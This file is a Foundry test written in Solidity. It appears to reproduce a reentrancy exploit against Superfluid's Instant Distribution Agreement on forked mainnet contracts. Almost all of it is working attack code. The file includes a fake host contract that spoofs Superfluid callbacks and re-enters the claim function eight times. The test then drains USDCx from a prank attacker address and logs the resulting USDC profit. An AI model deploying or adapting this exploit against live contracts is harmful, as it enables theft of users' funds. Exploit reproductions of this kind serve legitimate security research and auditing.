pragma solidity 0.8.23;
import "forge-std/Test.sol";

interface IIDA { function claim(address,address,uint32,address,bytes calldata) external returns (bytes memory); }
interface ISuperToken { function balanceOf(address) external view returns (uint256); function upgrade(uint256) external; function downgrade(uint256) external; }
interface IERC20 { function balanceOf(address) external view returns (uint256); function approve(address,uint256) external returns (bool); }
interface ISuperfluid { function callAgreement(address,bytes calldata,bytes calldata) external returns (bytes memory); }
interface IRouter { function swapExactETHForTokens(uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external payable returns (uint256[] memory amounts); }

contract DH {
    address public immutable ida; address public immutable token;
    address public pub; address public sub; uint32 public idx; uint256 public cnt; uint256 public mx;
    constructor(address i,address t){ida=i;token=t;}
    function set(address p,uint32 i2,address s,uint256 m)external{pub=p;idx=i2;sub=s;mx=m;}
    function getAppManifest(address)external pure returns(bool,bool,uint256){return(true,false,0);}
    function isApp(address)external pure returns(bool){return true;}
    function isCtxValid(bytes calldata)external pure returns(bool){return true;}
    function decodeCtx(bytes memory)external pure returns(uint8,uint8,uint256,address,bytes4,bytes memory,uint256,uint256,int256,address,address){return(0,1,0,address(0),bytes4(0),"",0,0,0,address(0),address(0));}
    function appCallbackPush(bytes calldata,address,uint256,int256,address)external pure returns(bytes memory){return"";}
    function appCallbackPop(bytes calldata,int256)external pure returns(bytes memory){return"";}
    function callAppBeforeCallback(address,bytes calldata,bool,bytes calldata)external returns(bytes memory){
        if(cnt<mx){unchecked{++cnt;}try IIDA(ida).claim(token,pub,idx,sub,_c()){}catch{}}return"";
    }
    function callAppAfterCallback(address,bytes calldata,bool,bytes calldata c)external pure returns(bytes memory){return c;}
    function go()external{cnt=0;IIDA(ida).claim(token,pub,idx,sub,_c());}
    function _c()internal pure returns(bytes memory){return abi.encode(abi.encode(uint256(1<<32),uint256(0),address(0),bytes4(0),bytes("")),abi.encode(uint256(0),int256(0),address(0),address(0)));}
    receive()external payable{}
}
contract Recv {
    function d(address t,address u,address payable to)external{
        uint256 b=ISuperToken(t).balanceOf(address(this));
        if(b>0)ISuperToken(t).downgrade(b);
        uint256 ub=IERC20(u).balanceOf(address(this));
        if(ub>0){IERC20(u).approve(to,ub);(bool ok,)=u.call(abi.encodeWithSignature("transfer(address,uint256)",to,ub));require(ok);}
    }
    receive()external payable{}
}
contract Pub {
    address constant HOST=0x3E14dC1b13c488a8d5D310918780c983bD5982E7;
    address constant IDA=0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1;
    function s(address t,uint32 i,address r,uint256 seed)external{
        ISuperfluid(HOST).callAgreement(IDA,abi.encodeWithSignature("createIndex(address,uint32,bytes)",t,i,new bytes(0)),"");
        ISuperfluid(HOST).callAgreement(IDA,abi.encodeWithSignature("updateSubscription(address,uint32,address,uint128,bytes)",t,i,r,uint128(1),new bytes(0)),"");
        ISuperfluid(HOST).callAgreement(IDA,abi.encodeWithSignature("updateIndex(address,uint32,uint128,bytes)",t,i,uint128(seed),new bytes(0)),"");
    }
    receive()external payable{}
}

contract USDCxSmallTest is Test {
    address constant HOST=0x3E14dC1b13c488a8d5D310918780c983bD5982E7;
    address constant IDA=0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1;
    address constant USDCx=0xCAa7349CEA390F89641fe306D93591f87595dc1F;
    address constant USDC=0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174;
    address constant ROUTER=0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff;
    address constant WMATIC=0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270;
    address constant ATK=0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;

    function setUp()public{vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"));}

    function test_smallUSDCx()public{
        vm.startPrank(ATK);
        
        // Buy 10 USDC
        address[] memory path=new address[](2);
        path[0]=WMATIC; path[1]=USDC;
        IRouter(ROUTER).swapExactETHForTokens{value: 10 ether}(0, path, ATK, 99999999999);
        uint256 usdcBal=IERC20(USDC).balanceOf(ATK);
        console.log("USDC bought:",usdcBal);
        
        // Upgrade to USDCx
        IERC20(USDC).approve(USDCx,type(uint256).max);
        ISuperToken(USDCx).upgrade(usdcBal * 1e12); // 6→18 dec
        uint256 usdcxBal=ISuperToken(USDCx).balanceOf(ATK);
        console.log("USDCx:",usdcxBal);
        
        Recv r=new Recv();
        DH dh=new DH(IDA,USDCx);
        Pub pub=new Pub();
        
        // Transfer USDCx to publisher
        (bool ok,)=USDCx.call(abi.encodeWithSignature("transfer(address,uint256)",address(pub),usdcxBal));
        require(ok);
        
        // Setup
        pub.s(USDCx,uint32(9999),address(r),usdcxBal);
        
        // Reentrancy drain with 8 reentries
        dh.set(address(pub),9999,address(r),8);
        dh.go();
        
        // Collect
        r.d(USDCx,USDC,payable(ATK));
        
        uint256 usdcAfter=IERC20(USDC).balanceOf(ATK);
        console.log("USDC after drain:",usdcAfter);
        console.log("USDC profit:",usdcAfter - usdcBal);
        
        vm.stopPrank();
    }
}
